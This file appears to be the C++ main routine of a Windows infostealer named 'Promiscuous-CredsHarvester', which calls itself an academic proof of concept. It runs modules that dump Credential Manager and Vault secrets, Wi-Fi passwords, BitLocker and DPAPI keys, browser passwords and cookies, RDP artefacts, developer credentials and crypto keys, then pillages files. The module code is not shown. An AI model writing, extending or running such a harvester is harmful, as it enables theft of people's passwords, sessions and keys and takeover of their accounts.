#include <iostream>
#include <windows.h>
#include "SystemCredentialsDump.h"
#include "DpapiMasterKeys.h"
#include "CredHistDump.h"
#include "VaultDump.h"
#include "ChromiumDump.h"
#include "FirefoxDump.h"
#include "GeckoAndIECookies.h"
#include "RdpDump.h"
#include "DevCredentialsDump.h"
#include "CryptoKeysDump.h"
#include "Pillaging.h"

int main() {
    SetConsoleOutputCP(CP_UTF8);

    std::cout << "========================================================\n";
    std::cout << "  Promiscuous-CredsHarvester — Academic PoC Engine      \n";
    std::cout << "========================================================\n";

    // --- Windows system credentials -------------------------------
    SystemCredentialsDump::DumpCredManager();
    SystemCredentialsDump::DumpWifiPasswords();
    SystemCredentialsDump::DecryptBitLockerAutoUnlock();
    SystemCredentialsDump::DumpEAPCertificates();

    // --- DPAPI master keys + password history ---------------------
    DpapiMasterKeys::Dump();
    //CredHistDump::Dump(); - maybe later bc this is archaic

    // --- Windows Vault (plaintext secrets) ------------------------
    VaultDump::Run();

    // --- Browsers (passwords + cookies) ---------------------------
    ChromiumDump::Run();
    FirefoxDump::Run();
    GeckoAndIECookies::RunAll();

    // --- Remote access (RDP artefacts) ----------------------------
    RdpDump::Run();

    // --- Developer / CLI credentials ------------------------------
    DevCredentialsDump::Run();

    // --- Cryptographic key material -------------------------------
    CryptoKeysDump::Run();

    // --- Generic file pillaging (catch-all) -----------------------
    Pillaging::Run();

    std::cout << "\n========================================================\n";
    std::cout << "[+] Execution finished.\n";

    return 0;
}